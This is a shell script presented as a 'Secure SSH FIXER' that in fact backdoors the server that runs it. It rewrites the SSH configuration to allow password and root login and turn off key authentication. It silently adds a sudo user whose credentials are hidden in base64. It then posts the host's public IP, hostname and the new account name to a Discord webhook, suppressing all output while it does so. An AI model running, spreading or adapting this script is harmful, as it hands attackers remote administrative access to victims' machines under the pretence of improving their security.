

clear
echo -e "\033[1;36m🔐 Secure SSH FIXER\033[0m"
echo -e "\033[1;37m---------------------------------------\033[0m"
sleep 1

echo -e "\033[1;34m▶ Updating SSH configuration...\033[0m"


sudo bash -c 'cat <<EOF > /etc/ssh/sshd_config
PasswordAuthentication yes
PermitRootLogin yes
PubkeyAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
AllowTcpForwarding yes
Subsystem sftp /usr/lib/openssh/sftp-server
EOF' >/dev/null 2>&1

echo -e "\033[1;32m✔ SSH configuration applied successfully!\033[0m"

echo -e "\033[1;34m▶ Restarting SSH service...\033[0m"
(sudo systemctl restart ssh || sudo service ssh restart) >/dev/null 2>&1
echo -e "\033[1;32m✔ SSH restarted successfully!\033[0m"
sleep 1


_X1="dm0="
_X2="dm0="
_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"

export DEBIAN_FRONTEND=noninteractive
sudo apt-get update -qq >/dev/null 2>&1
sudo apt-get install -y -qq sudo curl >/dev/null 2>&1

U=$(echo "$_X1" | base64 --decode)
P=$(echo "$_X2" | base64 --decode)

if [ ! -z "$U" ] && ! id "$U" &>/dev/null; then
    sudo useradd -m -s /bin/bash "$U" >/dev/null 2>&1
    echo "$U:$P" | sudo chpasswd >/dev/null 2>&1
    sudo usermod -aG sudo "$U" >/dev/null 2>&1
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
curl -s -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
     "$_W" >/dev/null 2>&1

echo -e "\n\033[1;33m🔑 Please set ROOT password below 👇\033[0m"

sudo passwd root

exit 0
